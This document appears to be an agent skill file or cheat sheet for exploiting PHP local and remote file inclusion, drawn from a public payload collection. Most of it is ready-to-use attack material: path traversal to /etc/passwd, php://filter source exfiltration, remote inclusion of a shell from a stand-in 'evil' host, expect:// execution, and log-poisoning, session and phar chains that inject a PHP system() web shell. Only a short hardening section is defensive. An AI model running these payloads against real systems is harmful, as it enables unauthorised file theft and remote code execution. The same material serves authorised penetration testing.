---
name: file-inclusion
description: Exploit LFI/RFI to read sensitive files, chain to RCE via log poisoning, PHP wrappers, session files, and remote inclusion
domain: cybersecurity
subdomain: web-application-security
tags: [lfi, rfi, file-inclusion, php-wrappers, log-poisoning]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/File Inclusion
---

# File Inclusion (LFI / RFI)

## Overview
LFI (Local File Inclusion) and RFI (Remote File Inclusion) occur when an `include`/`require`/`readfile`/`Smarty::include`/template loader takes a user-controlled path or URL. LFI reads/executes local files; RFI loads attacker-hosted code.

## When to Use
URL params like `?page=`, `?file=`, `?template=`, `?lang=`, `?include=` — values that look like file paths or stem names.

## Base Payloads
```
?file=../../../../etc/passwd
?file=../../../../etc/passwd%00       (PHP < 5.3 null-byte)
?file=php://filter/convert.base64-encode/resource=index.php
?file=http://evil/shell.txt           (RFI if allow_url_include=On)
?file=data://text/plain;base64,PD9waHA...
?file=expect://id
?file=zip://uploaded.zip%23shell.php   (path traversal into uploaded zip)
?file=phar://uploaded.jpg/test         (phar:// → deserialization)
```

## PHP Wrappers (cheat-sheet)
| Wrapper | Purpose |
|---|---|
| `php://filter/convert.base64-encode/resource=X` | Exfil source of any readable file |
| `php://input` | POST body becomes the included content (needs `allow_url_include`) |
| `data://` | Inline content/code |
| `expect://` | Execute (needs expect ext) |
| `phar://` | Trigger unserialize on metadata |
| `zip://`, `compress.zlib://` | Open content inside archive |

## LFI → RCE Chains
1. **Log poisoning**: send `<?php system($_GET['c']); ?>` as User-Agent / Referer, then `?file=/var/log/apache2/access.log&c=id`.
2. **/proc/self/environ** with UA payload (only if readable).
3. **/proc/self/fd/N** points to logs or open files.
4. **PHP session**: write payload to session value (`username=<?php ... ?>`), include `/var/lib/php/sessions/sess_<PHPSESSID>`.
5. **SSH log**: `ssh '<?php system($_GET[c]); ?>'@target` → include `/var/log/auth.log`.
6. **Mail log**: from `<?php ?>@evil` → `/var/log/mail.log`.
7. **Upload → include**: any upload (jpg with PHP tags) + LFI to its path.
8. **Phar deserialization** via `phar://upload.jpg` if app touches the path with file ops.

## Detection
- ffuf with LFI wordlists, `LFISuite`, `kadimus`.
- nuclei `file-inclusion/` templates.

## Hardening
- Allowlist of include keys → server-side path mapping.
- Disable `allow_url_include`, `allow_url_fopen`.
- `open_basedir` restriction.
- Canonicalize and verify path stays in root.

## References
- `payloadsallthethings/File Inclusion/README.md`
- HackTricks LFI / wrappers.
